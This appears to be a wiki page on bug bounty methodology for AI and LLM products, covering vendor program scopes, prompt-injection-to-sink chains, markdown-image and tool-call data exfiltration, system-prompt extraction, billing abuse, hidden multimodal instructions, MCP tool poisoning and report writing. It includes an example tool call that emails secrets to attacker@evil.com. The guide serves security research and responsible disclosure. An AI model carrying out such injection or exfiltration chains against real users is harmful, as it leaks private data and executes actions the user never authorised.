---
title: AI / LLM bug bounty methodology
slug: ai-llm-bug-bounty-methodology
aliases: [ai-bb-method, llm-bb-method, ai-red-team-bb]
---

> **TL;DR:** AI/LLM bug bounty is a distinct sub-discipline of [[bug-bounty-methodology]] that rewards demonstrable impact, not clever prompts. Programs from Anthropic, OpenAI, Google AI VRP, and Microsoft AI scope reports around concrete harm: data exfiltration, unauthorized tool execution, account/billing abuse, and integration failures. Treat every finding like a classic web bug — chain it to data crossing a trust boundary, an attacker-controlled action, or a money sink. Companion reading: [[direct-prompt-injection]], [[indirect-prompt-injection]], [[agentic-credential-exfiltration-via-tool-use]], [[mcp-server-supply-chain-attacks]], and [[ai-agent-sandbox-design]].

## Why it matters

LLM-powered products ship faster than their threat models mature. Vendors increasingly recognize that a prompt-injection chain that drains a customer's GitHub PATs is not "model safety" — it is a security vulnerability with the same severity as SSRF. At the same time, programs are flooded with low-quality "I made the model say a bad word" submissions that get closed as informative.

The methodology below mirrors how strong hunters approach classic web targets (see [[hacker-mindset-questioning]], [[demonstrating-impact]]): pick programs, read scope carefully, find a trust boundary, prove a payoff, write it up so triage can reproduce in under five minutes.

## Program landscape

### Anthropic

- Bug bounty for model safety + a separate program for product/app security (claude.ai, API surfaces).
- Pays for prompt injection with concrete tool/data impact, agent jailbreaks producing CBRN/cyber uplift only under a structured program, and classic web bugs on console.anthropic.com.
- Out-of-scope: refusals you disagreed with, hallucinations, "I bypassed the safety prompt and got a meaner joke."

### OpenAI

- Runs a Bugcrowd program for ChatGPT, the API platform, and Atlas (their browser).
- Model jailbreaks themselves are not in scope; **infrastructure** and **integration** bugs are. Examples: ChatGPT plugin SSRF, account takeover via OAuth, billing manipulation, file-search data leakage across users.

### Google AI VRP (abuse / VRP extension)

- Google extended their VRP to cover AI products (Gemini, Bard-era endpoints, NotebookLM, Workspace AI).
- Rewards prompt injection that crosses tenant boundaries, data exfil from Workspace via indirect injection, and tool-call abuse.
- See [[case-study-google-vrp-writeup-patterns]] for report shape.

### Microsoft AI bug bounty

- Covers Copilot products (M365 Copilot, GitHub Copilot, Security Copilot, Edge Copilot).
- High bar: must show real impact — read other users' data, exfil tenant secrets, or drive a destructive tool call. See [[copilot-zero-click-echoleak]] for the canonical EchoLeak chain.

### Other surfaces

- Hugging Face, Cursor, Windsurf, Replit, Perplexity all run programs (sometimes private). Cursor/Windsurf bugs lean on [[cursor-windsurf-ide-prompt-injection]] patterns.
- MCP server vendors are an emerging surface — see [[mcp-server-supply-chain-attacks]] and [[mcp-tool-poisoning-rug-pull]].

## In-scope bug classes

### Prompt injection with payoff

Bare prompt injection rarely pays. What pays is **injection -> sink**:

- Inject via a fetched URL, attached PDF, calendar invite, email, ticket, or shared doc.
- Sink: a tool call that leaks data (web fetch with secrets in URL), executes code, sends email, or modifies user state.
- See [[indirect-prompt-injection]] for the channel taxonomy.

### Jailbreaks tied to platform abuse

Pure jailbreaks (model says forbidden content) are typically out-of-scope. Jailbreaks become bugs when they enable:

- Tier bypass (free user accessing paid features, see denial-of-wallet below).
- System-prompt exfiltration that reveals tenant data or secrets.
- Cross-user data leakage via shared embedding/file-search indexes.

### Data exfiltration

- Markdown image rendering pulling a URL with chat history in query string.
- Tool-call to a fetch primitive that the attacker controls.
- Cross-conversation leakage via vector store namespace confusion.
- See [[agentic-credential-exfiltration-via-tool-use]].

### Denial of wallet / billing abuse

- Forcing infinite tool-call loops on the victim's account.
- Token amplification: tiny attacker input -> large model output billed to victim.
- Free-tier escape that lets unlimited inference run on the vendor's GPUs.

### Multimodal attacks

- Hidden text in images (white-on-white, steganographic, OCR-only prompts).
- Audio prompt injection in voice modes.
- Document attacks: PDFs with off-screen instructions, Office docs with metadata injection.

### Integration / agentic attacks

- MCP tool poisoning, see [[mcp-tool-poisoning-rug-pull]].
- Multi-agent collusion: [[multi-agent-collusion-attacks]].
- Sandbox escapes in code-interpreter style tools: see [[ai-agent-sandbox-design]].
- Browser-using agents: open redirect abuse, frame confusion, credential autofill.

## Typically out-of-scope

- Model hallucination ("the model invented a fact").
- Generic safety bypass without a downstream effect.
- Prompts that produce copyrighted text reproduction (handled via separate processes).
- Bias / fairness complaints (route to responsible AI teams).
- "I made it roleplay as DAN" — informative, not a bug.
- Self-XSS in chat output that only affects the attacker.

Always re-read scope before submitting; programs evolve fast. Apply [[program-scope-reading]] and [[scope-vertical-vs-horizontal]] rigor.

## Demonstrating impact

This is where most reports fail. Use [[demonstrating-impact]] as the base and add AI-specific framing:

- **What data leaked?** Name a concrete field: another user's email, a private repo file, a calendar entry, a system-prompt secret.
- **What tool fired?** Show the exact tool name and arguments. "The agent called `send_email(to=attacker@evil.com, body=<secrets>)`."
- **Who is the victim?** A second test account you control, not "imagine a user."
- **What is the trust boundary crossed?** Tenant boundary, user boundary, privilege tier.
- **Is it zero-click or one-click?** EchoLeak-style zero-click chains rate dramatically higher.

Record a video. Include the network trace. Include both the attacker artifact (the poisoned doc / URL / email) and the victim-side request log.

## Reproducibility requirements

Triage engineers need to reproduce in minutes:

- Pin the model and product version. "Claude Sonnet 4.5 via claude.ai on 2026-06-01."
- Provide the exact attacker payload as a file or gist.
- Provide a fresh victim-account walkthrough — do not rely on chat history.
- Note non-determinism: if the attack succeeds 3/10 times, say so and explain the reliability factors.
- For agent loops, capture the trace (LangSmith export, OpenAI/Anthropic trace IDs, console screenshots).

## Workflow to study

1. Build the foundation: [[llm-threat-model]], [[ai-red-teaming]], [[llm-application-source-review]].
2. Pick one program and read scope end-to-end (apply [[program-selection-tactics]] and [[target-selection-heuristics]]).
3. Map trust boundaries: who can put text in front of the model? Email, calendar, web fetch, shared docs, repos, RAG sources.
4. Enumerate tools/integrations the agent can invoke. List dangerous sinks (email send, code exec, file write, payment).
5. Try one channel at a time. Start with [[direct-prompt-injection]] to learn the model's quirks, then move to [[indirect-prompt-injection]] for real impact.
6. Build a small lab: see [[building-a-research-home-lab]]. Stand up the same MCP server, the same RAG stack, the same browser-agent.
7. Read public chains: EchoLeak, Cursor/Windsurf injections, Replit agent escapes. Apply [[reading-public-pocs-effectively]] and [[h1-disclosed-report-reading-method]].
8. When you find something, follow [[report-writing-step-by-step]] and the impact framing above.

## Defensive baseline (so you can argue severity)

Triagers will ask "why didn't existing defenses block this?" Be ready to address:

- Spotlighting / delimiter defenses (and why they failed in your case).
- Content filters on tool inputs/outputs.
- Allowlists on outbound fetch destinations.
- Human-in-the-loop confirmations for destructive tool calls.
- Per-tool capability scoping.
- See [[ai-agent-sandbox-design]] for the design space.

If your attack defeats all of these, say so explicitly — it raises severity.

## Ethical guidance

- Never test against real customer data. Use second accounts you own.
- Do not exfiltrate live secrets beyond the minimum proof needed; redact in the report.
- Respect rate limits and billing. Denial-of-wallet PoCs should be measured (e.g., 5 minutes of looping is enough to demonstrate, do not run for hours).
- Avoid attacks that require deceiving real third parties (e.g., emailing real Gmail users with malicious calendar invites).
- Follow [[responsible-disclosure-across-jurisdictions]] — AI product T&Cs sometimes contradict bounty-program safe harbors. Read both.
- Coordinate timelines under [[disclosure-and-comms]]; AI bugs frequently hit press, and vendors appreciate the heads-up.

## Common dupe traps

Apply [[dupe-mental-model]]. AI bounty has its own well-trodden classes:

- "Markdown image exfil via chat rendering" — patched repeatedly across vendors; only novel sinks/channels still pay.
- "System prompt extraction" — informative on most programs unless the system prompt contains tenant secrets.
- "Jailbreak via roleplay" — almost always closed.
- "I got the model to call eval" in a sandbox that was supposed to allow it — not a bug.

Read the program's hall of fame and recently disclosed reports before submitting.

## Related

- [[direct-prompt-injection]]
- [[indirect-prompt-injection]]
- [[jailbreaks]]
- [[agentic-credential-exfiltration-via-tool-use]]
- [[mcp-server-supply-chain-attacks]]
- [[mcp-tool-poisoning-rug-pull]]
- [[cursor-windsurf-ide-prompt-injection]]
- [[copilot-zero-click-echoleak]]
- [[multi-agent-collusion-attacks]]
- [[ai-agent-sandbox-design]]
- [[llm-threat-model]]
- [[ai-red-teaming]]
- [[llm-application-source-review]]
- [[demonstrating-impact]]
- [[report-writing-step-by-step]]
- [[program-scope-reading]]
- [[case-study-google-vrp-writeup-patterns]]

## References

- <https://hackerone.com/anthropic> — Anthropic bug bounty program scope.
- <https://bugcrowd.com/openai> — OpenAI Bugcrowd program scope and exclusions.
- <https://bughunters.google.com/about/rules/google-friends/5238081279098880/abuse-vulnerability-reward-program-rules> — Google abuse/AI VRP rules.
- <https://www.microsoft.com/en-us/msrc/bounty-ai> — Microsoft AI bug bounty terms.
- <https://owasp.org/www-project-top-10-for-large-language-model-applications/> — OWASP LLM Top 10 (use as severity grammar).
- <https://embracethered.com/blog/> — Johann Rehberger's running catalog of practical LLM exfil chains.
